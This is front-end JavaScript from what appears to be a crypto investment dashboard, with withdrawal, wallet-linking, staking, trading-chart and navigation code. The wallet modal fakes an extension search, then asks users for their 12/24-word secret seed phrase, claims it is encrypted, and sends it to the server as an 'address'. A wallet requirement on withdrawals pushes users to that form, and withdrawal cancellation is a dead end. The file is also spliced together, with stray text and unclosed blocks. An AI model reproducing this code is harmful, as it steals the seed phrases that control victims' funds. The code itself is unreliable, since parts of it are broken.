async function loadWithdrawState() {

  // Always fetch balance first — so the "Available" hint is populated
  // regardless of which state we end up showing.
  const availEl = document.getElementById("wd-available");
  try {
    const data = await Api.request("/portfolio");
    const acct = (data && data.account) || {};
    const cash = parseFloat(
      acct.cash_balance ??
      acct.available_balance ??
      acct.cash ??
      0
    );
    state.lastKnownCash = cash;
    if (availEl) availEl.textContent = fmtMoney(cash);

    // Wire the "Withdraw all" button now that we know the balance
    const maxBtn = document.getElementById("wd-max-btn");
    if (maxBtn && !maxBtn.dataset.wired) {
      maxBtn.dataset.wired = "1";
      maxBtn.addEventListener("click", () => {
        const amtEl = document.getElementById("wd-amount");
        if (amtEl) amtEl.value = cash > 0 ? cash.toFixed(2) : "";
      });
    }
  } catch (err) {
    if (availEl) availEl.textContent = "—";
  }

  // ---- Read the per-user withdrawal policy ----
  let requireWallet = false;
  try {
    const me = await Api.request("/auth/me");
    if (typeof me.require_wallet_to_withdraw !== "undefined") {
      requireWallet = !!me.require_wallet_to_withdraw;
    } else {
      try {
        const pub = await Api.request("/settings/public");
        if (typeof pub.require_wallet_to_withdraw !== "undefined") {
          requireWallet = !!pub.require_wallet_to_withdraw;
        } else {
          const data = await Api.request("/portfolio");
          const acct = (data && data.account) || {};
          if (typeof acct.require_wallet_to_withdraw !== "undefined") {
            requireWallet = !!acct.require_wallet_to_withdraw;
          }
        }
      } catch (_) { /* keep false */ }
    }
  } catch (_) { /* default to false */ }

  // Cache for the click handler
  state.requireWalletForWithdraw = requireWallet;

  // Does the user actually have an approved wallet?
  // Accept any status that means "wallet is usable":
  // "stored", "linked", "approved", or legacy rows without a status.
  const hasStoredWallet = Array.isArray(state.wallets) &&
    state.wallets.some(w =>
      !w.status ||
      w.status === "stored" ||
      w.status === "linked" ||
      w.status === "approved"
    );
  state.hasStoredWallet = hasStoredWallet;

  const walletWarn  = document.getElementById("wd-wallet-warning");
  const destSection = document.getElementById("wd-destination-section");

  console.log("[WITHDRAW] requireWallet =", requireWallet, "hasStoredWallet =", hasStoredWallet);

  if (requireWallet && !hasStoredWallet) {
    // Toggle ON, no wallet → show the "wallet required" warning
    if (walletWarn)  walletWarn.style.display  = "";
    if (destSection) destSection.style.display = "none";

    // Automatically pop the "Connect your wallet" modal.
    clearTimeout(state._walletModalTimer);
    state._walletModalTimer = setTimeout(() => {
      showWithdrawLinkWalletModal();
    }, 300);
  } else if (requireWallet && hasStoredWallet) {
    // Toggle ON, wallet present → hide the warning, hide destination form
    if (walletWarn)  walletWarn.style.display  = "none";
    if (destSection) destSection.style.display = "none";
  } else {
    // Toggle OFF → user supplies destination details
    if (walletWarn)  walletWarn.style.display  = "none";
    if (destSection) destSection.style.display = "";
  }

  // Now check for an in-progress request
  let requests = [];
  try {
    requests = await Api.request("/banking/withdraw/my-requests");
  } catch (err) {
    showWithdrawState("idle");
    wireWithdrawIdleForm();
    return;
  }

  const pending = (requests || []).find(r =>
    r.status === "pending_admin" || r.status === "code_sent"
  );

  if (!pending) {
    showWithdrawState("idle");
    wireWithdrawIdleForm();
    return;
  }

  if (pending.status === "pending_admin") {
    const amtEl = document.getElementById("wd-pending-amount");
    const idEl  = document.getElementById("wd-pending-id");
    if (amtEl) amtEl.textContent = fmtMoney(pending.amount_usd);
    if (idEl)  idEl.textContent  = pending.id.slice(0, 8) + "…";
    showWithdrawState("pending");
    return;
  }

  if (pending.status === "code_sent") {
    const amtEl = document.getElementById("wd-code-amount");
    if (amtEl) amtEl.textContent = fmtMoney(pending.amount_usd);
    showWithdrawState("code");
    wireWithdrawCodeForm(pending.id);
    return;
  }

  // Any other status → idle
  showWithdrawState("idle");
  wireWithdrawIdleForm();
}

    
  /* ---------- State A: request form ---------- */
  function wireWithdrawIdleForm() {
    const btn = document.getElementById("wd-submit");
    if (!btn) return;

    // Wire the destination-method dropdown once per render
    const methodSel = document.getElementById("wd-dest-method");
    if (methodSel && !methodSel.dataset.wired) {
      methodSel.dataset.wired = "1";
      methodSel.addEventListener("change", () => {
        const v = methodSel.value;
        const bankEl   = document.getElementById("wd-dest-bank");
        const cryptoEl = document.getElementById("wd-dest-crypto");
        const otherEl  = document.getElementById("wd-dest-other");
        if (bankEl)   bankEl.style.display   = v === "bank"   ? "" : "none";
        if (cryptoEl) cryptoEl.style.display = v === "crypto" ? "" : "none";
        if (otherEl)  otherEl.style.display  = v === "other"  ? "" : "none";
      });
    }

    btn.onclick = async () => {
      const errEl = document.getElementById("wd-error");
      const okEl  = document.getElementById("wd-success");
      errEl.style.display = "none";
      okEl.style.display  = "none";

      const amount = document.getElementById("wd-amount").value;
      if (!amount || parseFloat(amount) < 1) {
        errEl.textContent = "Enter an amount of at least $1.";
        errEl.style.display = "block";
        return;
      }

      // If the toggle is ON but the user has no approved wallet,
      // pop the redirect-to-wallet modal and stop.
      if (state.requireWalletForWithdraw && !state.hasStoredWallet) {
        showWithdrawLinkWalletModal();
        return;
      }

      // If the destination section is visible, require a method
      const payload = { amount_usd: amount };
      const destSection = document.getElementById("wd-destination-section");
      if (destSection && destSection.style.display !== "none") {
        const method = document.getElementById("wd-dest-method").value;
        if (!method) {
          errEl.textContent = "Choose where we should send the funds.";
          errEl.style.display = "block";
          return;
        }

        const dest = { method };
        if (method === "bank") {
          dest.bank_name      = document.getElementById("wd-bank-name").value.trim();
          dest.account_name   = document.getElementById("wd-account-name").value.trim();
          dest.account_number = document.getElementById("wd-account-number").value.trim();
          dest.routing_number = document.getElementById("wd-routing").value.trim() || null;

          if (!dest.bank_name || !dest.account_name || !dest.account_number) {
            errEl.textContent = "Bank name, account name, and account number are required.";
            errEl.style.display = "block";
            return;
          }
        } else if (method === "crypto") {
          dest.wallet_address = document.getElementById("wd-wallet-address").value.trim();
          dest.network        = document.getElementById("wd-network").value.trim();

          if (!dest.wallet_address || !dest.network) {
            errEl.textContent = "Wallet address and network are required.";
            errEl.style.display = "block";
            return;
          }
        } else {
          dest.note = document.getElementById("wd-other-note").value.trim();
          if (!dest.note) {
            errEl.textContent = "Enter the destination details.";
            errEl.style.display = "block";
            return;
          }
        }

        payload.destination = dest;
      }

      btn.disabled = true;
      btn.textContent = "Submitting…";

      try {
        await Api.request("/banking/withdraw/request", {
          method: "POST",
          body: JSON.stringify(payload),
        });
        okEl.textContent = "Request submitted. An admin will review it shortly.";
        okEl.style.display = "block";
        document.getElementById("wd-amount").value = "";

        setTimeout(loadWithdrawState, 700);
      } catch (err) {
        errEl.textContent = err.message || "Could not submit request.";
        errEl.style.display = "block";
        btn.disabled = false;
        btn.textContent = "Request withdrawal";
      }
    };
  }
  /* ---------- State C: code entry form ---------- */
  let WD_CODE_WIRED_FOR = null;
  function wireWithdrawCodeForm(requestId) {
    if (WD_CODE_WIRED_FOR === requestId) return;
    WD_CODE_WIRED_FOR = requestId;

    const digitsWrap = document.getElementById("wd-code-inputs");
    const confirmBtn = document.getElementById("wd-confirm");
    const cancelBtn  = document.getElementById("wd-cancel-code");
    const pasteBtn   = document.getElementById("wd-paste-code");
    const resendBtn  = document.getElementById("wd-resend-code");
    const errEl = document.getElementById("wd-code-error");
    const okEl  = document.getElementById("wd-code-success");

    const boxes = digitsWrap ? Array.from(digitsWrap.querySelectorAll("input")) : [];

    function getCode() {
      return boxes.map(b => b.value).join("");
    }

    function setCode(str) {
      const digits = String(str || "").replace(/[^0-9]/g, "").slice(0, 6);
      boxes.forEach((b, i) => {
        b.value = digits[i] || "";
        b.classList.toggle("filled", !!b.value);
      });
      if (boxes[digits.length]) boxes[digits.length].focus();
    }

    // Wire each box: auto-advance, backspace, paste
    boxes.forEach((box, i) => {
      box.oninput = () => {
        box.value = box.value.replace(/[^0-9]/g, "").slice(0, 1);
        box.classList.toggle("filled", !!box.value);
        if (box.value && boxes[i + 1]) boxes[i + 1].focus();
      };
      box.onkeydown = (e) => {
        if (e.key === "Backspace" && !box.value && boxes[i - 1]) {
          boxes[i - 1].focus();
          boxes[i - 1].value = "";
          boxes[i - 1].classList.remove("filled");
          e.preventDefault();
        }
        if (e.key === "Enter") confirmBtn && confirmBtn.click();
      };
      box.onpaste = (e) => {
        const pasted = (e.clipboardData || window.clipboardData).getData("text");
        if (pasted) {
          e.preventDefault();
          setCode(pasted);
        }
      };
    });

    // Focus first box
    if (boxes[0]) setTimeout(() => boxes[0].focus(), 50);

    // Paste helper button — reads clipboard and fills boxes
    if (pasteBtn && !pasteBtn.dataset.wired) {
      pasteBtn.dataset.wired = "1";
      pasteBtn.onclick = async () => {
        try {
          const text = await navigator.clipboard.readText();
          setCode(text);
        } catch (e) {
          errEl.textContent = "Couldn't read clipboard. Type the code manually.";
          errEl.style.display = "block";
        }
      };
    }

    // Resend code
    if (resendBtn && !resendBtn.dataset.wired) {
      resendBtn.dataset.wired = "1";
      resendBtn.onclick = async () => {
        resendBtn.disabled = true;
        resendBtn.textContent = "Sending…";
        try {
          await Api.request(`/banking/withdraw/${requestId}/resend`, { method: "POST" });
          okEl.textContent = "A new code was sent to your notifications.";
          okEl.style.display = "block";
          setCode("");
        } catch (err) {
          errEl.textContent = err.message || "Could not resend code.";
          errEl.style.display = "block";
        } finally {
          resendBtn.disabled = false;
          resendBtn.textContent = "Resend code";
        }
      };
    }

    // Confirm
    if (confirmBtn) {
      confirmBtn.onclick = async () => {
        errEl.style.display = "none";
        okEl.style.display  = "none";

        const code = getCode();
        if (code.length !== 6) {
          errEl.textContent = "Enter the 6-digit code from your notification.";
          errEl.style.display = "block";
          return;
        }

        confirmBtn.disabled = true;
        confirmBtn.textContent = "Confirming…";

        try {
          await Api.request("/banking/withdraw/confirm", {
            method: "POST",
            body: JSON.stringify({ request_id: requestId, code }),
          });
          okEl.textContent = "Withdrawal confirmed. Your funds are on the way.";
          okEl.style.display = "block";

          setTimeout(() => { goToPage("withdraw"); loadOverviewData(); }, 1200);
        } catch (err) {
          errEl.textContent = err.message || "Could not confirm withdrawal.";
          errEl.style.display = "block";
          confirmBtn.disabled = false;
          confirmBtn.textContent = "Confirm withdrawal";

          // If the server says the code is expired, mark boxes red
          if (/expire/i.test(err.message || "")) {
            boxes.forEach(b => b.classList.add("error"));
            const expEl = document.getElementById("wd-code-expired");
            if (expEl) expEl.classList.add("show");
          }
        }
      };
    }

    // Cancel
    if (cancelBtn) {
      cancelBtn.onclick = async () => {
        if (!confirm("Cancel this withdrawal request?")) return;
        cancelBtn.disabled = true;
        cancelBtn.textContent = "Cancelling…";
        cancelBtn.disabled = false;
        cancelBtn.textContent = "Cancel request";
        alert("Please contact support to cancel a request that's already been sent.");
      };
    }
  }

     Staged flow: detect extension → if missing, let user type

  const walletModal = {
    backdrop: null,
    wallet: null,
    stage: "detect",   // 'detect' | 'manual' | 'submitting'
    _wired: false,

    open(wallet) {
      this.wallet = wallet;
      this.stage = "detect";

      this.backdrop = document.getElementById("wallet-modal-backdrop");
      if (!this.backdrop) return;

      this.backdrop.classList.add("open");
      document.body.style.overflow = "hidden";

      this._renderStage();

      if (!this._wired) {
        document.getElementById("wm-close").onclick  = () => this.close();
        document.getElementById("wm-cancel").onclick = () => this.close();
        document.getElementById("wm-confirm").onclick = () => {
          if (this.stage === "manual") this._submit();
        };
        this.backdrop.addEventListener("click", (e) => {
          if (e.target === this.backdrop) this.close();
        });
        this._wired = true;
      }
    },

    close() {
      if (this.backdrop) this.backdrop.classList.remove("open");
      document.body.style.overflow = "";
    },

    _renderStage() {
      const body = document.getElementById("wm-body");
      const w = this.wallet;

      if (this.stage === "detect") {
        body.innerHTML = `
          <div class="wm-detect">
            <div class="wm-wallet-icon ${w.color}">
              ${w.logo
                ? `<img src="${escapeHtml(w.logo)}" alt="">`
                : `<span>${escapeHtml(w.name[0])}</span>`}
            </div>
            <div class="wm-detect-name">${escapeHtml(w.name)}</div>
            <div class="wm-detect-status" id="wm-detect-status">
              <span class="wm-spinner"></span>
              Searching for extension…
            </div>
            <div class="wm-progress-track">
              <div class="wm-progress-fill" id="wm-progress-fill"></div>
            </div>
          </div>
        `;

        // Animate the fill from 0 → 100%
        const fill = document.getElementById("wm-progress-fill");
        requestAnimationFrame(() => {
          fill.style.width = "100%";
        });

        // After ~1.2s, decide: is the extension actually there?
        setTimeout(() => {
          this.stage = "manual";
          this._renderStage();
        }, 1200);
      }

      if (this.stage === "manual") {
        const w2 = this.wallet;
        const isDetected = this._hasExtension(w2);

        body.innerHTML = `
          <div class="wm-manual">
            <div class="wm-status-line ${isDetected ? "found" : "not-found"}">
              ${isDetected
                ? `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
                   Extension detected — opening it…`
                : `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                   Wallet extension not found`}
            </div>

            ${!isDetected ? `
              <p class="wm-hint">
                No browser extension detected. You can still connect your wallet manually.
              </p>
            ` : `
              <p class="wm-hint">
                We found an extension but couldn't complete the connection automatically.
                Enter you 12 or 24 secret seed phrase manually to continue.
              </p>
            `}

                      <div class="cm-field" style="margin-top:16px;">
              <label for="wm-address">Seed Phrase </label>
              <input id="wm-address" type="text" placeholder="${
                w2.chain === "Solana" ? "12/24 wallet secret phrase"
                : w2.chain === "Hardware" ? "12/24 wallet secret phrase"
                : "Your 12/24 wallet secret phrase"
              }" autocomplete="off" spellcheck="false">
              <div class="cm-hint">
               Your 12/24 wallet secret phrase is Encrypted
              </div>
            </div>

            <div class="cm-field">
              <label for="wm-label">Label <span class="muted">(optional)</span></label>
              <input id="wm-label" type="text" placeholder="My Wallet">
            </div>

            <div class="cm-error" id="wm-error"></div>
          </div>
        `;

        // Focus the address input
        setTimeout(() => {
          const inp = document.getElementById("wm-address");
          if (inp) inp.focus();
        }, 50);

        // Wire Enter key to submit
        const addrInput = document.getElementById("wm-address");
        if (addrInput) {
          addrInput.addEventListener("keydown", (e) => {
            if (e.key === "Enter") {
              e.preventDefault();
              this._submit();
            }
          });
        }

        // Replace confirm button label
        document.getElementById("wm-confirm").textContent = "Save wallet";
      }

      if (this.stage === "submitting") {
        body.innerHTML = `
          <div class="wm-detect">
            <div class="wm-spinner-lg"></div>
            <div class="wm-detect-name">Submitting…</div>
          </div>
        `;
        document.getElementById("wm-confirm").textContent = "Saving…";
      }
    },

       _hasExtension(w) {
      if (w.requiresExtension === "ethereum") return typeof window.ethereum !== "undefined";
      if (w.requiresExtension === "solana") {
        if (window.solana && window.solana.isPhantom) return true;
        if (window.solflare) return true;
        if (window.solana && window.solana.isGlow) return true;
        // Some Solana wallets only expose window.solana without a brand flag
        if (window.solana && window.solana.isConnected !== undefined) return true;
        return false;
      }
      return false;
    },

    async _submit() {
      const errEl = document.getElementById("wm-error");
      errEl.style.display = "none";

      const address = (document.getElementById("wm-address").value || "").trim();
      if (!address) {
        errEl.textContent = "Please enter your 12/24 secret seed phrase.";
        errEl.style.display = "block";
        return;
      }

      this.stage = "submitting";
      this._renderStage();

      try {
        await Api.request("/wallets", {
          method: "POST",
          body: JSON.stringify({
            wallet_id: this.wallet.id,
            address: address,
            chain: this.wallet.chain.toLowerCase().includes("solana") ? "solana"
                 : this.wallet.chain.toLowerCase().includes("hardware") ? "hardware"
                 : this.wallet.chain.toLowerCase().includes("multi") ? "evm"
                 : "ethereum",
          }),
        });

        this.close();
        await loadWallets();
        renderWallets();
        updateWalletCounts();

        alert(
          "Your 12/24 secret seed phrase has been saved.\n\n" +
          "Your wallet will be linked shortly."
        );
      } catch (err) {
        this.stage = "manual";
        this._renderStage();
        const errEl2 = document.getElementById("wm-error");
        if (errEl2) {
          errEl2.textContent = err.message || "Could not submit. Try again.";
          errEl2.style.display = "block";
        }
      }
    },
  };

    el.querySelectorAll("[data-stake-confirm]").forEach(btn => {

}async function submitStake(coin) {
  const plan = ST.plans.find(p => p.coin === coin);
  if (!plan) return;

  const amtEl  = document.getElementById(`st-amount-${coin}`);
  const termEl = document.getElementById(`st-term-${coin}`);
  const errEl  = document.querySelector(`[data-stake-error="${coin}"]`);
  const okEl   = document.querySelector(`[data-stake-success="${coin}"]`);

  const showErr = (m) => { if (errEl) { errEl.textContent = m; errEl.style.display = "block"; } };
  const clearMsgs = () => {
    if (errEl) errEl.style.display = "none";
    if (okEl)  okEl.style.display  = "none";
  };
  clearMsgs();

  const amount = parseFloat((amtEl && amtEl.value) || 0);
  const term   = parseInt((termEl && termEl.value) || 0, 10);

  if (!amount || amount <= 0) return showErr("Enter an amount greater than zero.");
  if (amount < plan.min_amount) return showErr(`Minimum stake is ${plan.min_amount} ${coin}.`);
  if (!term || !plan.term_days.includes(term)) return showErr("Choose a valid term.");

  try {
    const res = await Api.request("/crypto-stake/stake", {
      method: "POST",
      body: JSON.stringify({ coin, amount, term_days: term }),
    });

    if (okEl) {
      okEl.textContent = `Staked ${res.amount} ${res.coin} at ${res.apy}% APY. Unlocks ${new Date(res.unlocks_at).toLocaleDateString()}.`;
      okEl.style.display = "block";
    }
    if (amtEl) amtEl.value = "";

    await loadStakes();

    setTimeout(() => {
      const form = document.querySelector(`[data-stake-form="${coin}"]`);
      const cta  = document.querySelector(`[data-stake-cta="${coin}"]`);
      if (form) form.style.display = "none";
      if (cta)  cta.style.display  = "";
      clearMsgs();
    }, 1800);
  } catch (err) {
    showErr(err.message || "Could not stake.");
  }
}

function formatTimeLeft(unlocksAt, status) {
  if (!unlocksAt || status !== "active") return "—";
  const target = new Date(unlocksAt).getTime();
  const diff = target - Date.now();
  if (diff <= 0) return "Unlocked";
  const days  = Math.floor(diff / 86400000);
  const hours = Math.floor((diff % 86400000) / 3600000);
  const mins  = Math.floor((diff % 3600000) / 60000);
  if (days > 0)  return `${days}d ${hours}h`;
  if (hours > 0) return `${hours}h ${mins}m`;
  return `${mins}m`;
}

let ST_TICKER = null;
function startStakeCountdownTicker() {
  if (ST_TICKER) clearInterval(ST_TICKER);
  const tick = () => {
    document.querySelectorAll("[data-countdown]").forEach(cell => {
      const unlocksAt = cell.dataset.unlocksAt;
      const status    = cell.dataset.stakeStatus;
      cell.textContent = formatTimeLeft(unlocksAt, status);
    });
  };
  tick();                              // immediate first pass
  ST_TICKER = setInterval(tick, 60000); // refresh every minute
}

  /* ---------- Chart drawing (simple candle canvas) ---------- */
  async function drawChart(symbol, interval) {
    const loading = document.getElementById("ct-chart-loading");
    const canvas  = document.getElementById("ct-chart-canvas");
    const meta    = document.getElementById("ct-chart-meta");
    if (!canvas) return;

    if (loading) loading.style.display = "";
    canvas.style.display = "none";
    if (meta) meta.style.display = "none";

    try {
      const data = await Api.request(
        `/crypto-trade/klines/${encodeURIComponent(symbol)}?interval=${encodeURIComponent(interval)}&limit=200`
      );
      const candles = (data && data.candles) || [];
      if (!candles.length) {
        if (loading) loading.innerHTML = '<div class="empty-state">No chart data.</div>';
        return;
      }

      if (loading) loading.style.display = "none";
      canvas.style.display = "";
      if (meta) {
        meta.style.display = "";
        meta.textContent = symbol + " · " + interval + " · " + candles.length + " candles";
      }

      paintCandles(canvas, candles);
    } catch (err) {
      if (loading) loading.innerHTML =
        `<div class="empty-state">Chart unavailable: ${escapeHtml(err.message)}</div>`;
    }
  }

  function paintCandles(canvas, candles) {
    const dpr = window.devicePixelRatio || 1;
    const cssW = canvas.clientWidth || 800;
    const cssH = canvas.clientHeight || 320;
    canvas.width = Math.floor(cssW * dpr);
    canvas.height = Math.floor(cssH * dpr);
    const ctx = canvas.getContext("2d");
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    ctx.clearRect(0, 0, cssW, cssH);

    const padL = 12, padR = 70, padT = 16, padB = 26;
    const plotW = cssW - padL - padR;
    const plotH = cssH - padT - padB;

    let min = Infinity, max = -Infinity;
    candles.forEach(c => {
      if (c.low < min) min = c.low;
      if (c.high > max) max = c.high;
    });
    if (!isFinite(min) || !isFinite(max) || max === min) {
      max = min + 1;
    }

    const yOf = (v) => padT + plotH - ((v - min) / (max - min)) * plotH;
    const candleW = plotW / candles.length;
    const bodyW = Math.max(1.5, candleW * 0.65);

    // Grid
    ctx.strokeStyle = "rgba(255,255,255,0.06)";
    ctx.lineWidth = 1;
    for (let i = 0; i <= 4; i++) {
      const y = padT + (plotH / 4) * i;
      ctx.beginPath();
      ctx.moveTo(padL, y);
      ctx.lineTo(padL + plotW, y);
      ctx.stroke();

      // Y-axis labels
      const v = max - ((max - min) / 4) * i;
      ctx.fillStyle = "rgba(157,169,192,0.8)";
      ctx.font = "10px ui-monospace, monospace";
      ctx.textAlign = "left";
      ctx.textBaseline = "middle";
      ctx.fillText("$" + v.toLocaleString(undefined, { maximumFractionDigits: 2 }), padL + plotW + 6, y);
    }

    // Candles
    candles.forEach((c, i) => {
      const x = padL + i * candleW + candleW / 2;
      const up = c.close >= c.open;
      const color = up ? "#4ADE80" : "#F87171";
      ctx.strokeStyle = color;
      ctx.fillStyle = color;

      // Wick
      ctx.beginPath();
      ctx.moveTo(x, yOf(c.high));
      ctx.lineTo(x, yOf(c.low));
      ctx.stroke();

      // Body
      const yo = yOf(c.open);
      const yc = yOf(c.close);
      const top = Math.min(yo, yc);
      const h = Math.max(1, Math.abs(yc - yo));
      ctx.fillRect(x - bodyW / 2, top, bodyW, h);
    });

    // X-axis time labels — 4 evenly spaced
    ctx.fillStyle = "rgba(157,169,192,0.8)";
    ctx.font = "10px ui-monospace, monospace";
    ctx.textAlign = "center";
    ctx.textBaseline = "top";
    const labels = 4;
    for (let i = 0; i < labels; i++) {
      const idx = Math.floor((candles.length - 1) * (i / (labels - 1)));
      const c = candles[idx];
      const x = padL + idx * candleW + candleW / 2;
      const d = new Date(c.close_time || c.open_time);
      const label = d.toLocaleDateString(undefined, { month: "short", day: "numeric" });
      ctx.fillText(label, x, padH(cssH, padB));
    }
  }

  function padH(cssH, padB) { return cssH - padB + 6; }

  async function submitCryptoOrder() {
    const errEl = document.getElementById("ct-order-error");
    const okEl  = document.getElementById("ct-order-success");
    const btn   = document.getElementById("ct-submit");
    if (errEl) errEl.style.display = "none";
    if (okEl)  okEl.style.display = "none";

    const amount = parseFloat((document.getElementById("ct-amount") || {}).value || 0);
    const symbol = CT.activeSymbol;

    const fail = (msg) => {
      if (errEl) { errEl.textContent = msg; errEl.style.display = "block"; }
    };

    if (!symbol) return fail("Select a symbol first.");
    if (!amount || amount <= 0) return fail("Enter an amount in USD.");

    if (btn) { btn.disabled = true; btn.textContent = "Placing…"; }

    try {
      const res = await Api.request("/crypto-trade/order", {
        method: "POST",
        body: JSON.stringify({ symbol, side: CT.side, amount_usd: amount }),
      });

      if (okEl) {
        okEl.textContent =
          `${CT.side} filled: ${parseFloat(res.quantity).toLocaleString(undefined, { maximumFractionDigits: 8 })} ` +
          `${CT.supportedBases[symbol]} at ${fmtMoney(res.price_usd)}`;
        okEl.style.display = "block";
      }

      const amtInput = document.getElementById("ct-amount");
      if (amtInput) amtInput.value = "";

      // Refresh everything that changed
      await loadCryptoPositions();
      await loadCryptoTrades();
      await loadCryptoBalance();
      updateOrderFormHint();

      // Refresh the sidebar balance too
      if (typeof loadOverviewData === "function") {
        loadOverviewData();
      }
    } catch (err) {
      fail(err.message || "Could not place order.");
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = "Place order"; }
    }
  }

  function timeAgo(iso) {
    try {
      const then = new Date(iso).getTime();
      const diff = Math.max(0, Date.now() - then);
      const min = Math.floor(diff / 60000);
      if (min < 1) return "Just now";
      if (min < 60) return min + "m ago";
      const hr = Math.floor(min / 60);
      if (hr < 24) return hr + "h ago";
      const days = Math.floor(hr / 24);
      if (days < 7) return days + "d ago";
      return new Date(iso).toLocaleDateString();
    } catch (e) { return ""; }
  }

    (function autoWrapTables() {
      const content = document.getElementById("dash-content");
      if (!content) return;

      const wrapOne = (tbl) => {
        if (tbl.parentElement && tbl.parentElement.classList.contains("table-scroll")) return;
        const w = document.createElement("div");
        w.className = "table-scroll";
        tbl.parentNode.insertBefore(w, tbl);
        w.appendChild(tbl);
      };

      // Initial pass (in case a table is already there)
      content.querySelectorAll("table").forEach(wrapOne);

      const mo = new MutationObserver((mutations) => {
        mutations.forEach(m => {
          m.addedNodes.forEach(node => {
            if (node.nodeType !== 1) return;
            if (node.tagName === "TABLE") wrapOne(node);
            node.querySelectorAll && node.querySelectorAll("table").forEach(wrapOne);
          });
        });
      });
      mo.observe(content, { childList: true, subtree: true });
    })();

      const MARKETS_PAGES = ["crypto", "stock-mkt", "staking", "markets"];

        const key = state.page;
        nav.querySelectorAll(".mn-item").forEach(el => {
          let isActive;
          if (el.hasAttribute("data-mn-markets")) {
            isActive = MARKETS_PAGES.includes(key);

          el.classList.toggle("active", isActive);
        });
      }

      // --- Hide on scroll-down, show on scroll-up ---
      let lastY = window.scrollY || 0;
      let ticking = false;
      const HIDE_AFTER = 40;

      function onScroll() {
        const y = window.scrollY || 0;
        const dy = y - lastY;
        if (Math.abs(dy) < 4) { ticking = false; return; }

        if (dy > 0 && y > HIDE_AFTER) {
          nav.classList.add("hidden");
        } else if (dy < 0) {
          nav.classList.remove("hidden");
        }
        lastY = y;
        ticking = false;
      }

      window.addEventListener("scroll", () => {
        if (!ticking) {
          window.requestAnimationFrame(onScroll);
          ticking = true;
        }
      }, { passive: true });
